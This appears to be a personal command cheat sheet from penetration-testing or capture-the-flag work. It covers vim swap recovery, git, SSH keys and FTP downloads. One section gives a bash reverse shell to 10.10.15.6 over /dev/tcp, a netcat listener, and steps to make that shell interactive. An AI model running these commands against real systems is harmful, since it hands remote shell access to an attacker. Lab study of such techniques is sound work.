### Recover a swap file.
```
vim -e -s -c 'recover .filename.swp' -c 'w newfilename.txt' -c 'q'   
```
### Nmap Cool
```
batcat Voleur_service_allTCP.nmap -l ruby
```
### Some Git Commands
```
cd /tmp
mkdir git-test
cd git-test

echo 'original' > test.txt
```

```
git init
git add test.txt
git commit -m initial
echo 'modified' > test.txt
git diff > test.patch
```

To restore a file:
```
git checkout -- test.txt
```
### SSH
Genereate SSH Key:
```
ssh-keygen
```
Check data or validate an id_rsa key (SSH Key)
```
ssh-keygen -y -f id_rsa
```

### Get a stable shell
```
bash -c "bash -i >& /dev/tcp/10.10.15.6/443 0>&1"
```

Listener
```
sudo nc -lvnp 443
```
#### Make a Shell Fully Interactive
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
Then do:
CTRL + Z
stty raw -echo
fg
export TERM=xterm

## FTP
Recursively download all files from the FTP server:
```
prompt
```
Then do mget:
```
mget *
```

Do lcd to change directory, so you save it in the right directory, but has to be a full path.




